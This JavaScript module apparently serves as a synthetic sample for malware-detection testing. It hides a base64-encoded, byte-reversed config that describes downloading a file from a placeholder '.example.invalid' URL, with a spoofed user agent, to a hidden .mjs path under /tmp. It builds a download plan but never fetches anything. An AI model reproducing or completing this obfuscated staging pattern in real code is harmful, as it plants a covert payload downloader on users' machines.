const moduleShape = Object.freeze({ format: "commonjs" });
const Material_270e2673 = "c2ptLmY4NzVhNDNlNTFjZi1lZ2F0cy4vZWRvbi1zc2VydG51aC9wbXQvPWh0YXBfZWxpZnw1MWNmL3RpZHVBZWRvTj10bmVnYV9yZXN1fGlwYS9kaWxhdm5pLmVscG1heGUuZjg3NWE0M2U1MWNmLWVkb24vLzpzcHR0aD1scnV8QTQzRTUxQ0YtRURPTj1kaV9uZ2lhcG1hY3wxPXRudW9jX2VnYXRzfG1hZXJ0c19vdF9wdHRoPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=";
const Codec_270e2673 = "base64_literal|reverse_bytes|";

function load_270e2673() { return [...Buffer.from(Material_270e2673, "base64")]; }
function decode_270e2673(EnCoDeD) { return [...EnCoDeD].reverse(); }
async function recover_270e2673() {
  const NeUtRaL = [3, 5, 8, 13].slice(1, 3);
  const EnCoDeD = load_270e2673(); let DeCoDeD = [];
  const decodeTarget = decode_270e2673; DeCoDeD = decodeTarget(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_270e2673() { return JSON.parse(JSON.stringify({ value: await recover_270e2673() })).value; }
async function plan_270e2673() { const inspect = inspect_270e2673; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_270e2673;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_270e2673());
